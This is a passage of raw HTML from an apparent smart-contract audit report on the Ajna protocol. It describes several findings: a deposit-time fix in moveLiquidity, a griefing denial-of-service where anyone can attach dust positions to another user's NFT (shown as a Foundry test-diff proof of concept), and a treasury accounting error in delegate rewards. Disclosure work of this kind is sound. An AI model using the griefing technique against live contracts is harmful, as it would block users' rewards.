3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider using the resulting time of the destination position, for example:</p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L262-L323\">https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L262-L323</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"9\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    function moveLiquidity(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        MoveLiquidityParams calldata params_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) external override mayInteract(params_.pool, params_.tokenId) nonReentrant {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        Position storage fromPosition = positions[params_.tokenId][params_.fromIndex];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        MoveLiquidityLocalVars memory vars;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        vars.depositTime = fromPosition.depositTime;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        Position storage toPosition = positions[params_.tokenId][params_.toIndex];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        // update position LP state</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        fromPosition.lps -= vars.lpbAmountFrom;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        toPosition.lps   += vars.lpbAmountTo;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-       // update position deposit time to the from bucket deposit time</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       // update position deposit time with the renewed to bucket deposit time</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       (, vars.depositTime) = pool.lenderInfo(params_.toIndex, address(this));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        toPosition.depositTime = vars.depositTime;</span></span></span></code></pre>\n<p>Notice, that this time value will be influenced by the other PositionManager positions in the <code>params_.toIndex</code> bucket, but the surface described will be closed as it will be controlled against <code>params_.toIndex</code> bucket bankruptcy time.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/494#issuecomment-1554797890\">ith-harvey (Ajna) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-03-position-nft-can-be-spammed-with-insignificant-positions-by-anyone-until-rewards-dos\" style=\"position:relative;\"><a href=\"#h-03-position-nft-can-be-spammed-with-insignificant-positions-by-anyone-until-rewards-dos\" aria-label=\"h 03 position nft can be spammed with insignificant positions by anyone until rewards dos permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/488\">[H-03] Position NFT can be spammed with insignificant positions by anyone until rewards DoS</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/488\">0xTheC0der</a>, also found by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/508\">aviggiano</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/506\">ro1sharkm</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/505\">DadeKuma</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/356\">evmboi32</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/303\">sakshamguruji</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/259\">juancito</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/178\">rvierdiiev</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/171\">Haipls</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/109\">kodyvim</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/105\">SpicyMeatball</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/94\">ToonVH</a>, and <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/79\">azhar</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L170-L216\">https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L170-L216</a><br>\n<a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L466-L485\">https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L466-L485</a></p>\n<p>The <a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L170-L216\">PositionManager.memorializePositions(params_)</a> method can be called by <strong>anyone</strong> (per design, see 3rd party test cases) and allows <strong>insignificantly</strong> small (any value > 0) positions to be attached to <strong>anyone</strong> else’s positions NFT, see PoC. As a result, the <code>positionIndexes[params_.tokenId]</code> storage array for an NFT with given token ID can be spammed with positions without the NFT owner’s consent.</p>\n<p>Therefore, the <a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L466-L485\">PositionManager.getPositionIndexesFiltered(tokenId_)</a> method might exceed the block gas limit when iterating the <code>positionIndexes[tokenId_]</code> storage array. However, the <a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L325-L349\">RewardsManager.calculateRewards(…)</a> and <a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L384-L414\">RewardsManager._calculateAndClaimRewards(…)</a> methods rely on the aforementioned method to succeed in order to calculate and pay rewards.</p>\n<p>All in all, a griefer can spam anyone’s position NFT with insignificant positions until the rewards mechanism fails for the NFT owner due to DoS (gas limit). Side note: A position NFT also cannot be burned as long as such insignificant positions are attached to it, see <a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L142-L154\">PositionManager.burn(…)</a>.</p>\n<h3 id=\"proof-of-concept-2\" style=\"position:relative;\"><a href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The following <em>diff</em> is based on the existing test case <code>testMemorializePositions</code> in <code>PositionManager.t.sol</code> and demonstrates that insignificant positions can be attached by anyone.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"10\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/ajna-core/tests/forge/unit/PositionManager.t.sol b/ajna-core/tests/forge/unit/PositionManager.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index bf3aa40..56c85d1 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/ajna-core/tests/forge/unit/PositionManager.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/ajna-core/tests/forge/unit/PositionManager.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -122,6 +122,7 @@ contract PositionManagerERC20PoolTest is PositionManagerERC20PoolHelperContract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function testMemorializePositions() external {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         address testAddress = makeAddr(&quot;testAddress&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        address otherAddress = makeAddr(&quot;otherAddress&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 mintAmount  = 10000 * 1e18;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         _mintQuoteAndApproveManagerTokens(testAddress, mintAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -134,17 +135,17 @@ contract PositionManagerERC20PoolTest is PositionManagerERC20PoolHelperContract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         _addInitialLiquidity({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             from:   testAddress,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            amount: 3_000 * 1e18,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            amount: 1, //3_000 * 1e18,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             index:  indexes[0]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         _addInitialLiquidity({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             from:   testAddress,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            amount: 3_000 * 1e18,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            amount: 1, //3_000 * 1e18,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             index:  indexes[1]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         _addInitialLiquidity({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             from:   testAddress,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            amount: 3_000 * 1e18,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            amount: 1, // 3_000 * 1e18,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             index:  indexes[2]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -165,17 +166,20 @@ contract PositionManagerERC20PoolTest is PositionManagerERC20PoolHelperContract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // allow position manager to take ownership of the position</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256[] memory amounts = new uint256[](3);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        amounts[0] = 3_000 * 1e18;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        amounts[1] = 3_000 * 1e18;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        amounts[2] = 3_000 * 1e18;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        amounts[0] = 1; //3_000 * 1e18;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        amounts[1] = 1; //3_000 * 1e18;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        amounts[2] = 1; //3_000 * 1e18;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         _pool.increaseLPAllowance(address(_positionManager), indexes, amounts);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // memorialize quote tokens into minted NFT</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        changePrank(otherAddress); // switch other address (not owner of NFT)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         vm.expectEmit(true, true, true, true);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        emit TransferLP(testAddress, address(_positionManager), indexes, 9_000 * 1e18);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        emit TransferLP(testAddress, address(_positionManager), indexes, 3 /*9_000 * 1e18*/);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         vm.expectEmit(true, true, true, true);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         emit MemorializePosition(testAddress, tokenId, indexes);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        _positionManager.memorializePositions(memorializeParams);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        _positionManager.memorializePositions(memorializeParams);  // switch back to test address (owner of NFT)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        changePrank(testAddress);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // check memorialization success</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 positionAtPriceOneLP = _positionManager.getLP(tokenId, indexes[0]);</span></span></span></code></pre>\n<h3 id=\"tools-used\" style=\"position:relative;\"><a href=\"#tools-used\" aria-label=\"tools used permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VS Code, Foundry</p>\n<h3 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Requiring that The <a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L170-L216\">PositionManager.memorializePositions(params_)</a> can only be called by the NFT owner or anyone who has approval would help but break the 3rd party test cases.</p>\n<p>Alternatively, one could enforce a minimum position value to make this griefing attack extremely unattractive.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/488#issuecomment-1554799142\">ith-harvey (Ajna) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-04-delegation-rewards-are-not-counted-toward-granting-fund\" style=\"position:relative;\"><a href=\"#h-04-delegation-rewards-are-not-counted-toward-granting-fund\" aria-label=\"h 04 delegation rewards are not counted toward granting fund permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/450\">[H-04] Delegation rewards are not counted toward granting fund</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/450\">Kenshin</a>, also found by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/461\">hyh</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/389\">REACH</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/289\">rbserver</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/263\">Ruhum</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/150\">Dug</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/103\">0xRobocop</a>, and <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/39\">nobody2018</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-grants/src/grants/base/StandardFunding.sol#L236-L265\">https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-grants/src/grants/base/StandardFunding.sol#L236-L265</a><br>\n<a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-grants/src/grants/base/StandardFunding.sol#L216-L217\">https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-grants/src/grants/base/StandardFunding.sol#L216-L217</a></p>\n<p>Each period reserves a reward for granting up to <a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-grants/src/grants/base/StandardFunding.sol#L27\">3% (GBC: Global Budget Constraint)</a>. The GBC is split into two parts:</p>\n<ol>\n<li>90% for proposal granting. Any proposal requesting more than 90% will <a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-grants/src/grants/base/StandardFunding.sol#L390-L391\">revert</a>. The total amount requested across winning proposals must not <a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-grants/src/grants/base/StandardFunding.sol#L447-L450\">exceed this percentage</a>.</li>\n<li>10% for voters who have participated in that distribution period as an incentive.</li>\n</ol>\n<p>Voters who have participated can claim their reward after the period has ended via <code>claimDelegateReward()</code>. However, the claim function does not account for the claimed reward towards treasury granting. As a result, the treasury technically reserves up to 90% in each period while actually granting 100%.</p>\n<p>Consider this example:</p>\n<ol>\n<li>The treasury has a total of <code>1000 AJNA</code>. 3% is reserved for this period, resulting in a GBC of <code>30 AJNA</code>. The treasury is updated to <code>1000 - 30 = 970 AJNA</code>.</li>\n<li>90% is for proposals (<code>27 AJNA</code>) and 10% is for voters (<code>3 AJNA</code>).</li>\n<li>Assume all <code>27 AJNA</code> are fully granted among winning proposals.</li>\n<li>Assume 10 voters in total, all fully voted and have equal voting power. Each voter receives <code>0.3 AJNA</code>, totaling <code>3 AJNA</code>.</li>\n<li>The treasury has spent <code>27 AJNA + 3 AJNA</code>, leaving an actual balance of <code>970 AJNA</code>.</li>\n<li>This round has ended and the treasury updates its balance before starting a new one using <a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-grants/src/grants/base/StandardFunding.sol#L217\">this logic</a>. <code>970 += (30 - 27)</code> = <code>973</code>.</li>\n<li>The treasury accounts for <code>973 AJNA</code> while having only <code>970 AJNA</code> in actuality.</li>\n</ol>\n<h3 id=\"more-detailed-analysis\" style=\"position:relative;\"><a href=\"#more-detailed-analysis\" aria-label=\"more detailed analysis permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>More detailed analysis</h3>\n<p>When the current period has ended and before starting a new one, the treasury will <a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-grants/src/grants/base/StandardFunding.sol#L217\">re-account its amount in case the last period did not utilize all the reserved reward</a>. For example, if the last period granted only 80% of the GBC among winning proposals, the remaining 10% will be re-added to the treasury.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"11\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">base</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StandardFunding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">197</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_updateTreasury</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">198:        </span><span class=\"mtk10\">uint24</span><span class=\"mtk1\"> </span><span class=\"mtk10\">distributionId_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">199</span><span class=\"mtk1\">:    ) </span><span class=\"mtk11\">private</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">200</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fundedSlateHash</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_distributions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">distributionId_</span><span class=\"mtk1\">].</span><span class=\"mtk12\">fundedSlateHash</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">201</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fundsAvailable</span><span class=\"mtk1\">  = </span><span class=\"mtk12\">_distributions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">distributionId_</span><span class=\"mtk1\">].</span><span class=\"mtk12\">fundsAvailable</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">202</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">203</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fundingProposalIds</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_fundedProposalSlates</span><span class=\"mtk1\">[</span><span class=\"mtk12\">fundedSlateHash</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">204</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">205</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalTokensRequested</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">206</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">numFundedProposals</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">fundingProposalIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">207</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span 